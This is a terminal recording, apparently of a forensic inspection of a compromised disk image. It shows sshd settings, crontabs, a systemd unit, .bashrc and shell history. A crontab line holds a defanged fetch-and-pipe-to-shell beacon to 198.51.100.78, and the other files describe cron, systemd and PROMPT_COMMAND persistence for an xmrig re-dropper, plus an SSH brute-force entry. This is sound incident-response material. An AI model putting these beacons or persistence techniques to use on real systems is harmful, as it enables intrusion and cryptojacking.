[44.278017, "o", "Port 22\r\nProtocol 2\r\nHostKey /etc/ssh/ssh_host_rsa_key\r\nSyslogFacility AUTHPRIV\r\nUsePAM yes\r\nX11Forwarding yes\r\nSubsystem sftp /usr/lib/openssh/sftp-server\r\nPermitRootLogin yes\r\nPasswordAuthentication yes\r\nMaxAuthTries 6\r\n"]
[44.278136, "o", "\u001b[?2004hroot@58bb37a3cf48:/app# "]
[44.278154, "o", "cat /disk/etc/crontab"]
[44.278229, "o", "\r\n\u001b[?2004l\r"]
[44.278585, "o", "SHELL=/bin/bash\r\n0 3 * * * root /usr/local/bin/backup.sh\r\n17 * * * * root run-parts /etc/cron.hourly\r\n"]
[44.278644, "o", "\u001b[?2004h"]
[44.278673, "o", "root@58bb37a3cf48:/app# "]
[44.278769, "o", "cat /disk/var/spool/cron/root\r\n\u001b[?2004l\r"]
[44.279063, "o", "# m h dom mon dow user command\r\n0 3 * * * root /usr/local/bin/backup.sh\r\n30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf\r\n*/15 * * * * nobody /usr/bin/check-health.sh\r\n# * * * * * root <defanged beacon: curl hxxp://198.51.100.78/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload\r\n"]
[44.279174, "o", "\u001b[?2004hroot@58bb37a3cf48:/app# "]
[44.279293, "o", "cat /disk/etc/systemd/system/system-update-helper.service\r\n\u001b[?2004l\r"]
[44.27977, "o", "[Unit]\r\nDescription=System Update Helper\r\nAfter=network.target\r\n[Service]\r\nExecStart launches an xmrig / pgdaemon re-dropper (defanged)\r\n[Install]\r\nWantedBy=multi-user.target\r\n"]
[44.279786, "o", "\u001b[?2004hroot@58bb37a3cf48:/app# cat /disk/root/.bashrc\r\n\u001b[?2004l\r"]
[44.280058, "o", "# .bashrc\r\nshell-init persistence: PROMPT_COMMAND beacon to 198.51.100.78 (defanged)\r\n"]
[44.280152, "o", "\u001b[?2004hroot@58bb37a3cf48:/app# "]
[44.28033, "o", "cat /disk/home/devops/.bash_history\r\n\u001b[?2004l\r"]
[44.280755, "o", "git status\r\ntop -bn1 | head\r\nvim config.yml\r\ntail -f /var/log/syslog\r\ndf -h\r\nhydra-style SSH brute-force against sshd (wordlist, user=root) — defanged, not executed here\r\nsystemctl status nginx\r\nls -la\r\ncd /var/www\r\ndocker ps\r\n"]
